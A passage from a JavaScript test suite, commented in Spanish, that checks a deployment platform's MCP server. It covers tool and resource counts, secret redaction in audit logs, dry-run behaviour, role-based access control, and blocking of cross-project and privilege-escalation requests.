    // 15. El transporte antiguo sigue vivo, pero marcado como deprecado.
    const legacyRes = await fetch(`${base}/api/mcp/message`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 'legacy-1', method: 'initialize', params: {} })
    });
    assert.strictEqual(legacyRes.status, 200, 'La era antigua no puede romperse');
    assert.strictEqual(legacyRes.headers.get('deprecation'), 'true');
    assert.ok(legacyRes.headers.get('link').includes('/api/mcp'), 'Debe apuntar al sucesor');
    const legacy = await legacyRes.json();
    assert.strictEqual(legacy.result.protocolVersion, '2024-11-05');
    console.log('  ✓ Transporte 2024-11-05 sigue funcionando y se anuncia como deprecado');
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
}

async function testMcpV2Capabilities() {
  const express = require('express');
  const projectManager = require('../server/services/projectManager');
  const mcpStreamableHttp = require('../server/services/mcpStreamableHttp');
  const V = mcpServer.protocol.PROTOCOL_VERSION;

  // 1. 10 Recursos (7 culkibo://* + 3 ui://culkibo/* MCP Apps) y 13 Prompts
  const resources = mcpServer.listResources();
  assert.strictEqual(resources.length, 10, `Se esperaban 10 recursos MCP (7 JSON + 3 MCP Apps), hay ${resources.length}`);
  for (const uri of ['culkibo://projects', 'culkibo://pods', 'culkibo://doctor', 'culkibo://domains', 'culkibo://fleet', 'culkibo://uptime', 'culkibo://environments', 'ui://culkibo/topology', 'ui://culkibo/incident-remediator', 'ui://culkibo/coolify-migration-diff']) {
    assert.ok(resources.some(r => r.uri === uri), `Falta recurso ${uri}`);
  }
  const fleetRes = await mcpServer.readResource('culkibo://fleet');
  assert.ok(fleetRes.contents[0].text.includes('"servers"'));
  assert.ok(!fleetRes.contents[0].text.includes('privateKey'));
  const uptimeRes = await mcpServer.readResource('culkibo://uptime');
  assert.ok(uptimeRes.contents[0].text.includes('"monitors"'));
  const envRes = await mcpServer.readResource('culkibo://environments');
  assert.ok(envRes.contents[0].text.includes('"projects"'));

  const prompts = mcpServer.listPrompts();
  assert.strictEqual(prompts.length, 13, `Se esperaban 13 prompts MCP (8 playbooks + 5 heredados), hay ${prompts.length}`);
  for (const name of [
    'deploy_safely', 'migrate_from_coolify', 'debug_production_crash', 'zero_downtime_db_upgrade',
    'security_audit_stack', 'setup_wildcard_tls_and_tunnel', 'optimize_ram_and_costs', 'disaster_recovery_drill',
    'debug-failed-deploy', 'zero-downtime-release', 'audit-security-tls', 'culkibo_multi_server_rollout', 'culkibo_incident_triage'
  ]) {
    assert.ok(prompts.some(p => p.name === name), `Falta prompt ${name}`);
  }
  const rolloutPrompt = mcpServer.getPrompt('culkibo_multi_server_rollout', { projectId: 'proj_demo', targetServers: 'srv_eu' });
  assert.ok(rolloutPrompt.messages[0].content.text.includes('culkibo_canary_rollout'));
  const triagePrompt = mcpServer.getPrompt('culkibo_incident_triage', { projectId: 'proj_demo', hostname: 'app.demo.test' });
  assert.ok(triagePrompt.messages[0].content.text.includes('culkibo_diagnose_incident'));
  assert.ok(triagePrompt.messages[0].content.text.includes('culkibo_auto_remediate'));
  console.log('  ✓ MCP 2.0/2026: 7 recursos y 13 prompts (8 playbooks + 5 heredados) verificados');

  // 2. Bugfixes y redacción ampliada
  const catTool = mcpServer.getToolByName('culkibo_list_catalog_templates');
  assert.ok(catTool && !/14 plantillas/i.test(catTool.description), 'La descripción del catálogo no debe hardcodear "14 plantillas"');

  const missingDom = await mcpServer.executeTool('culkibo_set_domain_basic_auth', { domainId: 'no_existe_seguro', enabled: false });
  assert.strictEqual(missingDom.isError, true);
  const missingDomErr = JSON.parse(missingDom.content[0].text);
  assert.ok(missingDomErr.remediation.includes('culkibo_manage_domain'), 'Debe referenciar culkibo_manage_domain y no culkibo_list_domains');
  assert.ok(!missingDomErr.remediation.includes('culkibo_list_domains'));

  const redacted = mcpServer.redactForAudit({
    privateKey: 'raw-key',
    sshKey: 'ssh-ed25519 ...',
    inviteToken: 'cki_12345678_secretvalue',
    tokenHash: 'abcdef',
    signingSecret: 'whsec_123',
    masterKey: 'mk_123',
    note: 'token is ckp_12345678_supersecretvalue'
  });
  assert.strictEqual(redacted.privateKey, '***');
  assert.strictEqual(redacted.sshKey, '***');
  assert.strictEqual(redacted.inviteToken, '***');
  assert.strictEqual(redacted.tokenHash, '***');
  assert.strictEqual(redacted.signingSecret, '***');
  assert.strictEqual(redacted.masterKey, '***');
  assert.strictEqual(redacted.note, '***');
  console.log('  ✓ Redacción ampliada (privateKey/sshKey/inviteToken/ck*_) y bugfixes verificados');

  // 3. Universal dryRun: true (cero mutaciones) + RBAC + Anti-IDOR
  const projA = projectManager.create({ name: 'MCP2 Project A', description: 'RBAC A', maintenanceMode: false });
  const projB = projectManager.create({ name: 'MCP2 Project B', description: 'RBAC B', maintenanceMode: false });
  try {
    // 3a. dryRun: true en culkibo_toggle_maintenance NO muta el proyecto
    const dryMaint = await mcpServer.executeTool('culkibo_toggle_maintenance', {
      projectId: projA.id,
      enabled: true,
      dryRun: true
    });
    assert.strictEqual(dryMaint.isError, false);
    assert.strictEqual(dryMaint.structuredContent.dryRun, true);
    assert.strictEqual(dryMaint.structuredContent.wouldExecute, true);
    assert.ok(Array.isArray(dryMaint.structuredContent.effects) && dryMaint.structuredContent.effects.length > 0);
    assert.strictEqual(projectManager.getById(projA.id).maintenanceMode, false, 'dryRun: true NUNCA puede mutar estado');

    // Auditar que dryRun se registró con dryRun: true
    const latestAudit = mcpServer.getAuditLog(1)[0];
    assert.strictEqual(latestAudit.toolName, 'culkibo_toggle_maintenance');
    assert.strictEqual(latestAudit.dryRun, true);

    // 3b. dryRun: true en culkibo_fleet_remove_server('local') reporta bloqueador
    const dryLocalRemove = await mcpServer.executeTool('culkibo_fleet_remove_server', { serverId: 'local', dryRun: true });
    assert.strictEqual(dryLocalRemove.isError, false);
    assert.strictEqual(dryLocalRemove.structuredContent.wouldExecute, false);
    assert.ok(dryLocalRemove.structuredContent.blockers.includes('CANNOT_REMOVE_LOCAL_SERVER'));

    // 3c. RBAC Viewer: solo RO, excluye culkibo_database_credentials y culkibo_rbac_list_tokens
    const viewerAuth = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_viewer_1', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
    };
    const viewerTools = mcpServer.getToolsForPrincipal(viewerAuth);
    assert.ok(viewerTools.length > 0 && viewerTools.length < 170);
    assert.ok(viewerTools.every(t => t.annotations.readOnlyHint === true), 'viewer solo puede ver herramientas readOnly');
    assert.ok(!viewerTools.some(t => t.name === 'culkibo_database_credentials'), 'viewer NO puede ver culkibo_database_credentials');
    assert.ok(!viewerTools.some(t => t.name === 'culkibo_rbac_list_tokens'), 'viewer NO puede ver culkibo_rbac_list_tokens');

    // Serialized tools cache isolation
    const pubBuf = mcpServer.getToolsSerialized();
    const privBuf = mcpServer.getToolsSerialized(viewerAuth);
    assert.strictEqual(JSON.parse(pubBuf.toString('utf8')).count, 170);
    assert.strictEqual(JSON.parse(privBuf.toString('utf8')).cacheScope, 'private');
    assert.strictEqual(JSON.parse(privBuf.toString('utf8')).count, viewerTools.length);

    // Viewer llamando herramienta mutadora incluso con dryRun: true -> FORBIDDEN (RBAC ANTES de dryRun)
    const viewerDryMut = await mcpServer.executeTool('culkibo_toggle_maintenance', {
      projectId: projA.id,
      enabled: true,
      dryRun: true
    }, { auth: viewerAuth });
    assert.strictEqual(viewerDryMut.isError, true);
    assert.strictEqual(JSON.parse(viewerDryMut.content[0].text).code, 'FORBIDDEN');

    // 3d. Developer con ACL [projA.id] -> puede ver projA, FORBIDDEN en projB (anti-IDOR incluso en dryRun)
    const devAuth = {
      ok: true,
      method: 'session',
      principal: { userId: 'usr_dev_1', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
    };
    const devList = await mcpServer.executeTool('culkibo_list_projects', {}, { auth: devAuth });
    assert.strictEqual(devList.isError, false);
    const devProjIds = devList.structuredContent.projects.map(p => p.id);
    assert.ok(devProjIds.includes(projA.id));
    assert.ok(!devProjIds.includes(projB.id), 'culkibo_list_projects debe filtrar proyectos fuera del ACL');

    const idorRead = await mcpServer.executeTool('culkibo_get_project', { projectId: projB.id }, { auth: devAuth });
    assert.strictEqual(idorRead.isError, true);
    assert.strictEqual(JSON.parse(idorRead.content[0].text).code, 'FORBIDDEN');

    const idorDryRun = await mcpServer.executeTool('culkibo_toggle_maintenance', {
      projectId: projB.id,
      enabled: true,
      dryRun: true
    }, { auth: devAuth });
    assert.strictEqual(idorDryRun.isError, true);
    assert.strictEqual(JSON.parse(idorDryRun.content[0].text).code, 'FORBIDDEN');

    // Recurso culkibo://projects filtrado por ACL
    const scopedRes = await mcpServer.readResource('culkibo://projects', { auth: devAuth });
    const scopedProjects = JSON.parse(scopedRes.contents[0].text).projects;
    assert.ok(scopedProjects.some(p => p.id === projA.id));
    assert.ok(!scopedProjects.some(p => p.id === projB.id));

    // 3e. Anti-escalada: admin NO puede invitar owner ni exportar secretos de instancia sin redactar
    const adminAuth = {
      ok: true,
      method: 'session',
      principal: { userId: 'usr_admin_1', role: 'admin', teamId: 'team_default', projectIds: null, scopes: ['*'] }
    };
    const escInvite = await mcpServer.executeTool('culkibo_team_invite_member', {
      email: 'evil@example.com',
      role: 'owner'
    }, { auth: adminAuth });
    assert.strictEqual(escInvite.isError, true);
    assert.strictEqual(JSON.parse(escInvite.content[0].text).code, 'FORBIDDEN');

    const escSnap = await mcpServer.executeTool('culkibo_export_instance_snapshot', {
      includeSecrets: true
    }, { auth: adminAuth });
    assert.strictEqual(escSnap.isError, true);
    assert.strictEqual(JSON.parse(escSnap.content[0].text).code, 'FORBIDDEN');

    // 3f. culkibo_rbac_whoami + ejecución real de herramientas v2 RO + aislamiento cross-team
    const whoamiSuper = await mcpServer.executeTool('culkibo_rbac_whoami', {});
    assert.strictEqual(whoamiSuper.isError, false);
    assert.strictEqual(whoamiSuper.structuredContent.isSuperAdmin, true);
    assert.strictEqual(whoamiSuper.structuredContent.allowedToolsCount, 170);

    const whoamiViewer = await mcpServer.executeTool('culkibo_rbac_whoami', {}, { auth: viewerAuth });
    assert.strictEqual(whoamiViewer.isError, false);
    assert.strictEqual(whoamiViewer.structuredContent.role, 'viewer');
    assert.strictEqual(whoamiViewer.structuredContent.allowedToolsCount, viewerTools.length);

    // Cross-team teamId bloqueado con FORBIDDEN antes de dryRun
    const crossTeamRes = await mcpServer.executeTool('culkibo_team_update_member', {
      action: 'remove',
      memberId: 'usr_other',
      teamId: 'team_foreign',
      dryRun: true
    }, { auth: adminAuth });
    assert.strictEqual(crossTeamRes.isError, true);
    assert.strictEqual(JSON.parse(crossTeamRes.content[0].text).code, 'FORBIDDEN');

    // Smoke end-to-end sobre herramientas RO v2 (lazy-loaded)
    const fleetList = await mcpServer.executeTool('culkibo_fleet_list_servers', {});
    assert.strictEqual(fleetList.isError, false);
    assert.ok(Array.isArray(fleetList.structuredContent.servers));

    const advisorRes = await mcpServer.executeTool('culkibo_cost_advisor', { monthlyServerCostEur: 20 });
    assert.strictEqual(advisorRes.isError, false);
    assert.strictEqual(typeof advisorRes.structuredContent.reclaimableRamMb, 'number');

    const freezeList = await mcpServer.executeTool('culkibo_deploy_freeze', { action: 'list', projectId: projA.id });
    assert.strictEqual(freezeList.isError, false);
    assert.strictEqual(freezeList.structuredContent.scope, projA.id);

    const syncConf = await mcpServer.executeTool('culkibo_sync_conflicts', { projectId: projA.id });
    assert.strictEqual(syncConf.isError, false);
    assert.ok(Array.isArray(syncConf.structuredContent.conflicts));

    const envList = await mcpServer.executeTool('culkibo_env_list', { projectId: projA.id });
    assert.strictEqual(envList.isError, false);
    assert.ok(Array.isArray(envList.structuredContent.environments));

    // 3g. Streamable HTTP forward de req.auth + Cache-Control: private, no-store
    const app = express();
    app.use(express.json());
    app.use((req, _res, next) => {
      req.auth = viewerAuth;
      next();
    });
    app.post('/api/mcp', mcpStreamableHttp.handlePost);
    const srv = await new Promise((resolve) => {
      const s = app.listen(0, '127.0.0.1', () => resolve(s));
    });
    try {
      const httpListRes = await fetch(`http://127.0.0.1:${srv.address().port}/api/mcp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
          'MCP-Protocol-Version': V,
          'Mcp-Method': 'tools/list'
        },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 'rbac-http-1',
          method: 'tools/list',
          params: {
            _meta: {
              'io.modelcontextprotocol/protocolVersion': V,
              'io.modelcontextprotocol/clientCapabilities': {}
            }
          }
        })
      });
      assert.strictEqual(httpListRes.status, 200);
      assert.strictEqual(httpListRes.headers.get('cache-control'), 'private, no-store');
      const body = await httpListRes.json();
      assert.strictEqual(body.result.cacheScope, 'private');
      assert.strictEqual(body.result.ttlMs, 0);
      assert.strictEqual(body.result.tools.length, viewerTools.length);
    } finally {
      await new Promise((resolve) => srv.close(resolve));
    }

    // 3h. Cross-Project Cron IDOR bloqueado (projectId: projA + cronId de projB -> FORBIDDEN)
    const cronManager = require('../server/services/cronManager');
    const cronB = cronManager.create(projB.id, {
      name: 'Foreign Cron B',
      schedule: '0 * * * *',
      mode: 'http',
      httpPath: '/health',
      enabled: true
    });
    try {
      const cronIdor = await mcpServer.executeTool('culkibo_manage_crons', {
        projectId: projA.id,
        action: 'toggle',
        cronId: cronB.id,
        enabled: false
      }, { auth: devAuth });
      assert.strictEqual(cronIdor.isError, true);
      assert.strictEqual(JSON.parse(cronIdor.content[0].text).code, 'FORBIDDEN');
      const cronBStillEnabled = cronManager.list(projB.id).find(c => c.id === cronB.id);
      assert.strictEqual(cronBStillEnabled.enabled, true, 'El cron de projB no puede ser alterado por projA');
    } finally {
      try { cronManager.remove(cronB.id); } catch (e) {}
    }

    // 3i. Token acotado a projectIds: [projA] NO puede escapar a mutaciones globales
    const scopedAdminAuth = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_scoped_adm', role: 'admin', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
    };
    const scopedAdminTools = mcpServer.getToolsForPrincipal(scopedAdminAuth);
    assert.ok(!scopedAdminTools.some(t => t.name === 'culkibo_gitops_apply'), 'Token por proyecto no debe ver culkibo_gitops_apply');
    assert.ok(!scopedAdminTools.some(t => t.name === 'culkibo_fleet_remove_server'), 'Token por proyecto no debe ver culkibo_fleet_remove_server');

    for (const [toolName, toolArgs] of [
      ['culkibo_gitops_apply', { yamlText: 'version: 1\nprojects: []', dryRun: true }],
      ['culkibo_fleet_remove_server', { serverId: 'srv_any', dryRun: true }],
      ['culkibo_deploy_freeze', { action: 'set', windows: [], dryRun: true }],
      ['culkibo_status_page_manage', { action: 'configure', slug: 'escape-test', title: 'Escape' }]
    ]) {
      const esc = await mcpServer.executeTool(toolName, toolArgs, { auth: scopedAdminAuth });
      assert.strictEqual(esc.isError, true, `${toolName} debe bloquearse para token acotado a projectIds`);
      assert.strictEqual(JSON.parse(esc.content[0].text).code, 'FORBIDDEN');
    }

    // 3j. Eliminado comodín `mcp:write`: un token con solo ['mcp:write'] NO puede invocar escrituras destructivas
    const mcpWriteOnlyAuth = {
      ok: true,
      method: 'api_token',
      principal: { userId: 'usr_mw', role: 'admin', teamId: 'team_default', projectIds: null, scopes: ['mcp:write'] }
    };
    const mwTools = mcpServer.getToolsForPrincipal(mcpWriteOnlyAuth);
    assert.strictEqual(mwTools.length, 0, 'scopes: ["mcp:write"] no debe conceder acceso masivo a herramientas de escritura');
    const mwCall = await mcpServer.executeTool('culkibo_gitops_apply', { yamlText: 'version: 1', dryRun: true }, { auth: mcpWriteOnlyAuth });
    assert.strictEqual(mwCall.isError, true);
    assert.strictEqual(JSON.parse(mwCall.content[0].text).code, 'FORBIDDEN');

    // 3k. Overrides per-project ACL (`none` y degradación a `viewer`) integrados con teamManager
    const fs = require('fs');
    const os = require('os');
    const path = require('path');
    const teamSingleton = require('../server/services/teamManager');
    const { TeamManager } = teamSingleton;
    const tmpRbacDir = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-acl-'));
    const origMulti = teamSingleton.isMultiUserEnabled;
    const origResolve = teamSingleton.resolveProjectRole;
    try {
      const tmpTm = new TeamManager({ dataDir: tmpRbacDir });
      const boot = tmpTm.bootstrapOwner({ email: 'owner@mcp-test.local', name: 'Owner', password: 'StrongPassword123!' });
      const ownerActor = tmpTm.verifyCredential(boot.sessionToken);
      const inv = tmpTm.createInvite(ownerActor, { email: 'dev@mcp-test.local', role: 'developer', teamId: 'team_default' });
      const accepted = tmpTm.acceptInvite({ token: inv.inviteToken, email: 'dev@mcp-test.local', name: 'Dev', password: 'DevPassword123!' });
      const devUserId = accepted.user.id;
      // Degradar a 'viewer' en projA y denegar con 'none' en projB (revoca sesión previa!)
      tmpTm.setProjectAcl(ownerActor, projA.id, { userId: devUserId, role: 'viewer', teamId: 'team_default' });
      tmpTm.setProjectAcl(ownerActor, projB.id, { userId: devUserId, role: 'none', teamId: 'team_default' });

      teamSingleton.isMultiUserEnabled = () => true;
      teamSingleton.resolveProjectRole = (p, proj) => tmpTm.resolveProjectRole(p, proj);

      // Sesión revocada ({ ok: false }) debe fallar cerrado (FORBIDDEN, 0 herramientas)
      const revokedAuth = tmpTm.verifyCredential(accepted.sessionToken);
      assert.strictEqual(revokedAuth.ok, false);
      assert.strictEqual(mcpServer.getToolsForPrincipal(revokedAuth).length, 0);
      const revokedCall = await mcpServer.executeTool('culkibo_get_project', { projectId: projA.id }, { auth: revokedAuth });
      assert.strictEqual(revokedCall.isError, true);
      assert.strictEqual(JSON.parse(revokedCall.content[0].text).code, 'FORBIDDEN');

      // Nueva sesión tras login aplica per-project ACL (`none` y degradación a `viewer`)
      const freshLogin = tmpTm.login({ email: 'dev@mcp-test.local', password: 'DevPassword123!' });
      const aclDevAuth = tmpTm.verifyCredential(freshLogin.sessionToken);
      assert.strictEqual(aclDevAuth.ok, true);

      // 'none' en projB -> denegado en lectura y ocultado en listado
      const deniedB = await mcpServer.executeTool('culkibo_get_project', { projectId: projB.id }, { auth: aclDevAuth });
      assert.strictEqual(deniedB.isError, true);
      assert.strictEqual(JSON.parse(deniedB.content[0].text).code, 'FORBIDDEN');
      const listAcl = await mcpServer.executeTool('culkibo_list_projects', {}, { auth: aclDevAuth });
      const listedIds = listAcl.structuredContent.projects.map(p => p.id);
      assert.ok(listedIds.includes(projA.id), 'projA (viewer) debe ser visible');
      assert.ok(!listedIds.includes(projB.id), 'projB (none) debe quedar oculto');

      // 'viewer' en projA -> lectura permitida, escritura/deploy bloqueada con FORBIDDEN incluso con dryRun: true
      const readA = await mcpServer.executeTool('culkibo_get_project', { projectId: projA.id }, { auth: aclDevAuth });
      assert.strictEqual(readA.isError, false);
      const mutA = await mcpServer.executeTool('culkibo_toggle_maintenance', { projectId: projA.id, enabled: true, dryRun: true }, { auth: aclDevAuth });
      assert.strictEqual(mutA.isError, true);
      assert.strictEqual(JSON.parse(mutA.content[0].text).code, 'FORBIDDEN');
      const deployA = await mcpServer.executeTool('culkibo_deploy_production', { projectId: projA.id, dryRun: true }, { auth: aclDevAuth });
      assert.strictEqual(deployA.isError, true);
      assert.strictEqual(JSON.parse(deployA.content[0].text).code, 'FORBIDDEN');
    } finally {
      teamSingleton.isMultiUserEnabled = origMulti;
      teamSingleton.resolveProjectRole = origResolve;
      fs.rmSync(tmpRbacDir, { recursive: true, force: true });
    }

    console.log('  ✓ MCP 2.0: dryRun universal (0 mutaciones), RBAC, per-project ACL, anti-IDOR (cron/global/team) y forwarding req.auth verificados');
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
  }
}

/**
 * MCP 2.1: auditoría automatizada de los 107 handlers, meta-discovery, validación
 * estricta de rangos/patrones/items, 4 handlers corregidos, 5 fugas RBAC/IDOR cerradas
 * y ciclo completo de autocuración (culkibo_diagnose_incident + culkibo_auto_remediate).
 */
async function testMcpV21Superpowers() {
  const fs = require('fs');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const deployManager = require('../server/services/deployManager');
  const dockerManager = require('../server/services/dockerManager');
  const systemDoctor = require('../server/services/systemDoctor');
  const sleepAdvisor = require('../server/services/sleepAdvisor');
  const uptimeMonitor = require('../server/services/uptimeMonitor');
  const gitopsManager = require('../server/services/gitopsManager');
  const ingressManager = require('../server/services/ingressManager');

  // 1. Auditoría automatizada de cableado sobre LAS 107 HERRAMIENTAS (0 stubs rotos, 0 métodos inexistentes, 0 errores sin remediation)
  const src = fs.readFileSync(path.join(__dirname, '..', 'server', 'services', 'mcpServer.js'), 'utf8');
  const tools = mcpServer.getToolsDefinition();
  const switchBlock = src.slice(src.indexOf('switch (toolName)'), src.indexOf('// MCP Resources & Prompts'));
  const caseNames = new Set();
  let match;
  const caseRe = /case\s+'(culkibo_[a-z0-9_]+)'\s*:/g;
  while ((match = caseRe.exec(switchBlock))) caseNames.add(match[1]);
  assert.strictEqual(caseNames.size, 170, `Todos los 170 tools deben tener handler en switch (hay ${caseNames.size})`);
  for (const t of tools) {
    assert.ok(caseNames.has(t.name), `Falta case para ${t.name}`);
  }

  const svcMap = {
    containerOrchestrator: require('../server/services/containerOrchestrator'),
    domainManager: require('../server/services/domainManager'),
    sslManager: require('../server/services/sslManager'),
    cloudflareService: require('../server/services/cloudflareService'),
    projectManager,
    dockerManager,
    dbBackupManager: require('../server/services/dbBackupManager'),
    githubService: require('../server/services/githubService'),
    ingressManager,
    caddyManager: require('../server/services/caddyManager'),
    deployManager,
    databaseManager: require('../server/services/databaseManager'),
    catalogManager: require('../server/services/catalogManager'),
    liveSyncEngine: require('../server/services/liveSyncEngine'),
    coolifyMigrator: require('../server/services/coolifyMigrator'),
    wordpressMigrator: require('../server/services/wordpressMigrator'),
    universalImporter: require('../server/services/universalImporter'),
    metricsCollector: require('../server/services/metricsCollector'),
    systemDoctor,
    notificationService: require('../server/services/notificationService'),
    cronManager: require('../server/services/cronManager'),
    previewManager: require('../server/services/previewManager'),
    webhookService: require('../server/services/webhookService'),
    fleet: require('../server/services/serverFleetManager'),
    fleetSvc: require('../server/services/serverFleetManager'),
    tm: require('../server/services/teamManager'),
    em: require('../server/services/environmentManager'),
    um: uptimeMonitor,
    gm: gitopsManager,
    sa: sleepAdvisor,
    dm: deployManager,
    sp: require('../server/services/smartPackBuilder'),
    et: require('../server/services/edgeTunnelService'),
    sca: require('../server/services/supplyChainAttestor'),
    otlp: require('../server/services/otlpExporter'),
    sr: require('../server/services/shadowReplayService'),
    tms: require('../server/services/timeMachineService'),
    finops: require('../server/services/finopsOptimizer'),
    bh: require('../server/services/buildHealerService'),
    fm: require('../server/services/fleetMeshService'),
    es: require('../server/services/edgeShieldService'),
    cveSvc: require('../server/services/cveDriftService'),
    dd: require('../server/services/driftDetectorService'),
    iac: require('../server/services/iacExporter'),
    sls: require('../server/services/secretLeaseService'),
    whBus: require('../server/services/webhookEventBus'),
    dbStudio: require('../server/services/dbStudioService'),
    s3Svc: require('../server/services/objectStorageService'),
    quotaSvc: require('../server/services/quotaMeteringService'),
    brandSvc: require('../server/services/brandThemeService'),
    drSvc: require('../server/services/backupDrillService'),
    sloSvc: require('../server/services/sloCanaryController'),
    aiSvc: require('../server/services/aiWorkloadService'),
    rbSvc: require('../server/services/remoteBuilderService'),
    logArch: require('../server/services/logArchiveService'),
    admSvc: require('../server/services/admissionPolicyService'),
    compSvc: require('../server/services/complianceBundleService'),
    volSvc: require('../server/services/volumeMigrationService'),
    expSvc: require('../server/services/edgeExperimentService'),
    synthSvc: require('../server/services/syntheticSentinelService'),
    sqlLint: require('../server/services/sqlMigrationLinter'),
    autoSvc: require('../server/services/workerAutoscalerService'),
    licSvc: require('../server/services/licenseAuditorService'),
    secSvc: require('../server/services/seccompProfileService'),
    imgAud: require('../server/services/imageBloatAuditor'),
    cronLease: require('../server/services/cronLeaseService'),
    piiSvc: require('../server/services/piiMaskerService'),
    oomSvc: require('../server/services/oomForensicsService'),
    oncallSvc: require('../server/services/oncallEscalationService'),
    egressSvc: require('../server/services/egressFirewallService'),
    repSvc: require('../server/services/replicaFailoverService'),
    gateSvc: require('../server/services/preDeploySecretGate'),
    maSvc: require('../server/services/multiArchPlannerService'),
    chaosSvc: require('../server/services/chaosGameDayService'),
    mtlsSvc: require('../server/services/mtlsMeshService'),
    flagSvc: require('../server/services/featureFlagService'),
    rlSvc: require('../server/services/apiRateLimitService'),
    anomSvc: require('../server/services/runtimeAnomalyService'),
    promoSvc: require('../server/services/digestPromotionService'),
    contractSvc: require('../server/services/apiContractGateService'),
    ociSvc: require('../server/services/ociSignatureVerifier'),
    streamSvc: require('../server/services/streamFloodGuardService'),
    dnsSvc: require('../server/services/dnsCutoverService'),
    reaperSvc: require('../server/services/orphanReaperService'),
    reproSvc: require('../server/services/reproducibleBuildService'),
    pgSvc: require('../server/services/previewGateService'),
    cacheSvc: require('../server/services/edgeCacheService'),
    vpaSvc: require('../server/services/resourceRightsizerService'),
    pmSvc: require('../server/services/postmortemCorrelatorService')
  };
  const missingCalls = [];
  const callRe = /\b([a-zA-Z0-9_]+)\.([a-zA-Z0-9_]+)\s*\(/g;
  while ((match = callRe.exec(switchBlock))) {
    const [, obj, fn] = match;
    if (svcMap[obj] && typeof svcMap[obj][fn] !== 'function') {
      missingCalls.push(`${obj}.${fn}()`);
    }
  }
  assert.deepStrictEqual(missingCalls, [], `Handlers MCP llaman a métodos inexistentes: ${missingCalls.join(', ')}`);
  assert.ok(!/throw new Error\(/.test(switchBlock), 'No debe haber throw new Error() sin tipar en handlers MCP');

  // Los 7 tools con acciones destructivas ahora son destructiveHint: true y soportan dryRun
  for (const name of [
    'culkibo_manage_watcher', 'culkibo_link_database', 'culkibo_manage_wildcard_dns01',
    'culkibo_manage_webhook', 'culkibo_manage_crons', 'culkibo_manage_previews', 'culkibo_status_page_manage'
  ]) {
    const t = mcpServer.getToolByName(name);
    assert.strictEqual(t.annotations.destructiveHint, true, `${name} debe tener destructiveHint: true`);
    assert.strictEqual(mcpServer.supportsDryRun(name), true, `${name} debe soportar dryRun`);
  }
  // Verificar que los 5 perfiles devuelven subconjuntos válidos
  for (const prof of ['core', 'deploy', 'ops', 'security', 'all']) {
    const subset = mcpServer.getToolsForPrincipal(null, { profile: prof });
    assert.ok(subset.length > 0, `El perfil ${prof} debe devolver herramientas`);
  }
  console.log('  ✓ Auditoría automatizada de 170 herramientas: 0 métodos inexistentes, 0 raw errors, 7 destructiveHints y 5 perfiles verificados');

  // 2. culkibo_search_tools (meta-discovery + aislamiento RBAC)
  const searchSuper = await mcpServer.executeTool('culkibo_search_tools', { query: 'postgres backup', limit: 5 });
  assert.strictEqual(searchSuper.isError, false);
  assert.ok(searchSuper.structuredContent.matchedCount >= 1);
  assert.ok(searchSuper.structuredContent.tools.some((t) => t.name.includes('database') && Boolean(t.inputSchema)));

  const viewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_v21_viewer', role: 'viewer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };
  const searchViewer = await mcpServer.executeTool('culkibo_search_tools', { query: 'delete database revoke token', limit: 15 }, { auth: viewerAuth });
  assert.strictEqual(searchViewer.isError, false);
  assert.ok(searchViewer.structuredContent.tools.every((t) => t.annotations.readOnlyHint === true), 'culkibo_search_tools NUNCA debe revelar herramientas de escritura a un viewer');
  console.log('  ✓ culkibo_search_tools (meta-discovery ES/EN + filtro RBAC estricto) verificado');

  // 3. Validación estricta de rangos (minimum/maximum), pattern y array items
  const badPct = await mcpServer.executeTool('culkibo_switch_traffic', { citadelPercent: 150 });
  assert.strictEqual(badPct.isError, true);
  const badPctEnv = JSON.parse(badPct.content[0].text);
  assert.strictEqual(badPctEnv.code, 'INVALID_ARGUMENT');
  assert.ok(badPctEnv.remediation && badPctEnv.remediation.length > 5);

  const badLines = await mcpServer.executeTool('culkibo_get_container_logs', { projectId: 'any', lines: 5 });
  assert.strictEqual(badLines.isError, true);
  assert.strictEqual(JSON.parse(badLines.content[0].text).code, 'INVALID_ARGUMENT');

  const badSlug = await mcpServer.executeTool('culkibo_status_page_manage', { action: 'configure', slug: 'INVALID SLUG!' });
  assert.strictEqual(badSlug.isError, true);
  assert.strictEqual(JSON.parse(badSlug.content[0].text).code, 'INVALID_ARGUMENT');

  const badItems = await mcpServer.executeTool('culkibo_canary_rollout', { projectId: 'any', action: 'start', steps: [10, 250] });
  assert.strictEqual(badItems.isError, true);
  assert.strictEqual(JSON.parse(badItems.content[0].text).code, 'INVALID_ARGUMENT');
  console.log('  ✓ Validación estricta de minimum/maximum, pattern y array items con remediation verificada');

  // Crear dos proyectos temporales aislados para pruebas de handlers, RBAC/IDOR y autocuración
  const projA = projectManager.create({ name: 'MCP21 Project A', description: 'Owned A', maintenanceMode: false, teamId: 'team_default' });
  const projB = projectManager.create({ name: 'MCP21 Project B', description: 'Foreign B', maintenanceMode: false, teamId: 'team_default' });

  try {
    // 4. Verificación de los 4 handlers reparados (mocks en memoria restaurados en finally)
    const origStopProd = deployManager.stopProduction;
    const origStartProd = deployManager.startProduction;
    const origApplyFix = systemDoctor.applyFix;
    const origGetCanary = deployManager.getCanaryState;
    const origSwitchCanary = deployManager.switchCanaryRoute;
    const origPromoteCanary = deployManager.promoteCanary;
    const calledOps = [];
    try {
      deployManager.stopProduction = async (pid) => { calledOps.push(`stop:${pid}`); return { stopped: true, projectId: pid }; };
      deployManager.startProduction = async (pid) => { calledOps.push(`start:${pid}`); return { started: true, projectId: pid }; };
      systemDoctor.applyFix = async (act) => { calledOps.push(`doctor:${act}`); return { ok: true, action: act, message: 'ok' }; };
      deployManager.getCanaryState = (pid) => ({
